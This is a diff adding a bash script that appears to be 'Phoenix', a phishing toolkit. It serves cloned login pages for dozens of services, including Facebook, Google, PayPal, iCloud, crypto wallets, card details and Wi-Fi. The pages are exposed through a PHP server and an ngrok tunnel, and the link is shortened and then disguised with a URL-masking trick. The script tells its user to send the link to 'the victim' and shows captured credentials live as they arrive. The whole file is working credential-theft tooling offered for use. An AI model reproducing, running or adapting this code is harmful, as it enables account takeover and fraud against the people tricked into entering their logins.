@@ -1,0 +1,473 @@
+#!/bin/bash
+#DEVELOPED BY DEVIL MASTER
+#github.com/isuruwa
+
+# Colors
+re='\e[1;31m'
+wh='\e[1;37m'
+bl='\e[1;34m'
+Escape="\033";
+ref="${Escape}[31m";
+gf="${Escape}[32m";
+lgf="${Escape}[92m"
+yf="${Escape}[33m";
+bf="${Escape}[34m";
+cf="${Escape}[36m";
+ee="${Escape}[0m";
+pu='\033[1;35m'
+cy='\033[1;36m'
+lg='\e[1;32m'
+ye='\e[1;33m'
+pink='\033[1;35m'
+
+trap_ctrlC() {
+echo -e $re "\n\n  [!]  Exiting Program"
+echo -e $lgf " [■] Thank You ! Stay Safe ! [■]\n"
+sleep 1
+exit 0
+}
+
+# Banner
+function banner() {
+clear
+echo -e $lgf "██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗"
+echo -e $wh "██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝"
+echo -e $lgf "██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ "
+echo -e $wh "██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ "
+echo -e $lgf "██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗"
+echo -e $wh "╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝ V 1.0\n"
+echo -e $re "╔================================================╗"
+echo -e $re "       $cy    DEVELOPED BY DEVIL MASTER              "
+echo -e $re "╚================================================╝\n"
+}
+
+# Spinner
+function spinner() {
+    local pid=$!
+    local delay=0.75
+    local spinstr='|/-\'
+    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [%c]  " "$spinstr"
+        local spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+        printf "\b\b\b\b\b\b"
+    done
+    printf "    \b\b\b\b"
+}
+
+
+# KILL NGROK
+function kill_session() {
+        php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
+        ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
+        kill -9 ${php} > /dev/null 2>&1
+        kill -9 ${ngrok} > /dev/null 2>&1
+}
+
+
+# Url Mask Concept - https://github.com/yogeshwaran01/maskurl
+function urlmask() {
+  echo -n -e "\033[1;32m\n  [+]  Enter Your Masking Url : "
+  read murl
+  echo -n -e "\033[1;32m  [+]  Enter KeyWords : "
+  read keys
+  para='(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
+  if [[ $murl =~ $para ]]
+  then
+      echo -e $lgf " [!]  Link Valid"
+      rmpara=$(echo $short_url |sed 's/http[s]\?:\/\///')
+      echo $rmpara
+      maskedlink=$murl-$keys@$rmpara
+      echo $maskedlink
+  else
+      echo -e $re " [!] Link not vald"
+      sleep 3
+      urlmask
+  fi 
+}
+
+# Starting PHP & Ngrok Servers
+function host() {
+  host="127.0.0.1"
+  port="4444"
+  printf "\033[1;36m  [●]  Running Php & Ngrok Server"; php -S "$host":"$port" > /dev/null 2>&1 & sleep 5; ngrok http "$host:$port" > /dev/null 2>&1 & sleep 30 & spinner
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+  short_url=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
+  urlmask
+}
+
+# Listening
+function listen() {
+  clear
+  banner
+  echo -e "\033[1;35m [■] Send the Generated Link to the Victim  [■]\n"
+  echo -e "\033[1;32m >>> Generated Link - $wh $maskedlink\n"
+  echo -e $re "====================================================\n"
+  echo -e $re "■ Press Ctrl+c for stop ...\n"
+  echo -e "\033[1;36m ■ Waiting For Credentials ... ■\n"
+  echo -e $wh ""
+}
+
+function fb() {
+  printf "\n\033[35m  [\e[1;37m01\033[35m]\e[1;37m  Facebook\n"
+  printf "\033[35m  [\e[1;37m02\033[35m]\e[1;37m  Fb  Advanced\n"
+  printf "\033[35m  [\e[1;37m03\033[35m]\e[1;37m  Fb  Messenger\n"
+  printf "\033[35m  [\e[1;37m04\033[35m]\e[1;37m  Fb  Security\n"
+  printf "\033[35m  [\e[1;37m00\033[35m]\e[1;37m  Back\n\n"
+  printf "\033[35m  [\e[1;37m+\033[35m]\e[1;37m  Enter option : "
+  read choice
+  if [[ $choice == "1" || $choice == "01" ]]
+  then
+    cd Sites/Facebook
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "2" || $choice == "02" ]]
+  then
+    cd Sites/fb_advanced
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "3" || $choice == "03" ]]
+  then
+    cd Sites/fb_messenger
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "4" || $choice == "04" ]]
+  then
+    cd Sites/fb_security
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "00" ]]
+  then
+    menu
+  else
+    fb
+  fi
+}
+
+function insta() {
+  printf "\n\033[35m  [\e[1;37m01\033[35m]\e[1;37m  Instagram\n"
+  printf "\033[35m  [\e[1;37m02\033[35m]\e[1;37m  Instagram Followers\n"
+  printf "\033[35m  [\e[1;37m03\033[35m]\e[1;37m  Instagram Vertify\n"
+  printf "\033[35m  [\e[1;37m00\033[35m]\e[1;37m  Back\n\n"
+  printf "\033[35m  [\e[1;37m+\033[35m]\e[1;37mEnter option : "
+  read choice
+  if [[ $choice == "1" || $choice == "01" ]]
+  then
+    cd Sites/Instagram
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "2" || $choice == "02" ]]
+  then
+    cd Sites/ig_followers
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "3" || $choice == "03" ]]
+  then
+    cd Sites/ig_vertify
+    host
+    listen
+    tail -f usernames.txt
+  elif [[ $choice == "00" ]]
+  then
+    menu
+  else
+    insta
+  fi
+}
+
+# Min Menu
+function menu() {
+clear
+banner
+printf "\033[35m  [\e[1;37m01\033[35m]\e[1;37m  Facebook         \033[35m  [\e[1;37m11\033[35m]\e[1;37m Twitch         \033[35m  [\e[1;37m21\033[35m]\e[1;37m Spotify       \033[35m  [\e[1;37m31\033[35m]\e[1;37m Yandex\n"
+printf "\033[35m  [\e[1;37m02\033[35m]\e[1;37m  Google           \033[35m  [\e[1;37m12\033[35m]\e[1;37m Microsoft      \033[35m  [\e[1;37m22\033[35m]\e[1;37m Quora         \033[35m  [\e[1;37m32\033[35m]\e[1;37m CC\n"
+printf "\033[35m  [\e[1;37m03\033[35m]\e[1;37m  Instagram        \033[35m  [\e[1;37m13\033[35m]\e[1;37m Steam          \033[35m  [\e[1;37m23\033[35m]\e[1;37m Pornhub       \033[35m  [\e[1;37m33\033[35m]\e[1;37m Mediafire\n"
+printf "\033[35m  [\e[1;37m04\033[35m]\e[1;37m  Twitter          \033[35m  [\e[1;37m14\033[35m]\e[1;37m VK             \033[35m  [\e[1;37m24\033[35m]\e[1;37m Adobe         \033[35m  [\e[1;37m34\033[35m]\e[1;37m Playstation\n"
+printf "\033[35m  [\e[1;37m05\033[35m]\e[1;37m  Linkedin         \033[35m  [\e[1;37m15\033[35m]\e[1;37m icloud         \033[35m  [\e[1;37m25\033[35m]\e[1;37m Badoo         \033[35m  [\e[1;37m35\033[35m]\e[1;37m Xbox\n"
+printf "\033[35m  [\e[1;37m06\033[35m]\e[1;37m  Github           \033[35m  [\e[1;37m16\033[35m]\e[1;37m Gitlab         \033[35m  [\e[1;37m26\033[35m]\e[1;37m Crypto        \033[35m  [\e[1;37m36\033[35m]\e[1;37m Pornhub\n"
+printf "\033[35m  [\e[1;37m07\033[35m]\e[1;37m  Stackoverflow    \033[35m  [\e[1;37m17\033[35m]\e[1;37m Netflix        \033[35m  [\e[1;37m27\033[35m]\e[1;37m Dropbox       \033[35m  [\e[1;37m37\033[35m]\e[1;37m Wifi\n"
+printf "\033[35m  [\e[1;37m08\033[35m]\e[1;37m  Wordpress        \033[35m  [\e[1;37m18\033[35m]\e[1;37m Origin         \033[35m  [\e[1;37m28\033[35m]\e[1;37m Ebay          \033[35m  [\e[1;37m38\033[35m]\e[1;37m Wifi-2\n"
+printf "\033[35m  [\e[1;37m09\033[35m]\e[1;37m  Snapchat         \033[35m  [\e[1;37m19\033[35m]\e[1;37m Pinterest      \033[35m  [\e[1;37m29\033[35m]\e[1;37m Paypal        \033[35m  [\e[1;37m39\033[35m]\e[1;37m Reddit\n"
+printf "\033[35m  [\e[1;37m10\033[35m]\e[1;37m  Yahoo            \033[35m  [\e[1;37m20\033[35m]\e[1;37m ProtonMail     \033[35m  [\e[1;37m30\033[35m]\e[1;37m Shopify       \033[35m  [\e[1;37m40\033[35m]\e[1;37m Steam\n\n"
+printf "\e[1;31m  [\033[1;37m+\e[1;31m]\e[1;31m  Location\n\n"
+printf "\033[35m  [\e[1;37mL1\033[35m]\e[1;37m  Nearyou\n"
+printf "\033[35m  [\e[1;37mL2\033[35m]\e[1;37m  Gdrive\n\n"
+printf "\e[1;31m  [\033[1;37m+\e[1;31m]\e[1;31m  Lockscreen\n\n"
+printf "\033[35m  [\e[1;37mP1\033[35m]\e[1;37m  Android\n"
+printf "\033[35m  [\e[1;37mP2\033[35m]\e[1;37m  Windows\n\n"
+printf "\e[1;31m  [\033[1;37m+\e[1;31m]\e[1;31m  Enter Option : "
+read choice
+if [[ $choice == "1" || $choice == "01" ]]
+then
+  fb
+elif [[ $choice == "2" || $choice == "02" ]]
+then
+  cd Sites/Google
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "3" || $choice == "03" ]]
+then
+  insta
+elif [[ $choice == "4" || $choice == "04" ]]
+then
+  cd Sites/Twitter
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "5" || $choice == "05" ]]
+then
+  cd Sites/Linkedin
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "6" || $choice == "06" ]]
+then
+  cd Sites/Github
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "7" || $choice == "07" ]]
+then
+  cd Sites/Stackoverflow
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "8" || $choice == "08" ]]
+then
+  cd Sites/Wordpress
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "9" || $choice == "09" ]]
+then
+  cd Sites/Snapchat
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "10" ]]
+then
+  cd Sites/Yahoo
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "11" ]]
+then
+  cd Sites/Twitch
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "12" ]]
+then
+  cd Sites/Microsoft
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "13" ]]
+then
+  cd Sites/Steam
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "14" ]]
+then
+  cd Sites/Vk
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "15" ]]
+then
+  cd Sites/Icloud
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "16" ]]
+then
+  cd Sites/Gitlab
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "17" ]]
+then
+  cd Sites/Netflix
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "18" ]]
+then
+  cd Sites/Origin
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "19" ]]
+then
+  cd Sites/Pinterest
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "20" ]]
+then
+  cd Sites/Protonmail
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "21" ]]
+then
+  cd Sites/Spotify
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "22" ]]
+then
+  cd Sites/Quora
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "23" ]]
+then
+  cd Sites/Pornhub
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "24" ]]
+then
+  cd Sites/Adobe
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "25" ]]
+then
+  cd Sites/Badoo
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "26" ]]
+then
+  cd Sites/Crypto
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "27" ]]
+then
+  cd Sites/Dropbox
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "28" ]]
+then
+  cd Sites/Ebay
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "29" ]]
+then
+  cd Sites/Paypal
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "30" ]]
+then
+  cd Sites/Shopify
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "31" ]]
+then
+  cd Sites/Yandex
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "32" ]]
+then
+  cd Sites/Cc
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "33" ]]
+then
+  cd Sites/Mediafire
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "34" ]]
+then
+  cd Sites/Playstation
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "35" ]]
+then
+  cd Sites/Xbox
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "36" ]]
+then
+  cd Sites/Pornhub
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "37" ]]
+then
+  cd Sites/Wifi
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "38" ]]
+then
+  cd Sites/Wifi2
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "39" ]]
+then
+  cd Sites/Reddit
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "40" ]]
+then
+  cd Sites/Steam
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "L1" || $choice == "l1" ]]
+then
+  cd Sites/Nearyou
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "L2" || $choice == "l2" ]]
+then
+  cd Sites/Gdrive
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "P1" || $choice == "p1" ]]
+then
+  cd Sites/Androidpattern
+  host
+  listen
+  tail -f usernames.txt
+elif [[ $choice == "P2" || $choice == "p2" ]]
+then
+  printf "\e[1;31m  [!]  Sorry , Still not Available . Coming Soon"
+  sleep 4
+  menu
+else
+  printf "\e[1;31m  [!]  Wrong Choice"
+  sleep 1
+  menu
+fi
+}
+
+trap trap_ctrlC INT
+kill_session
+menu
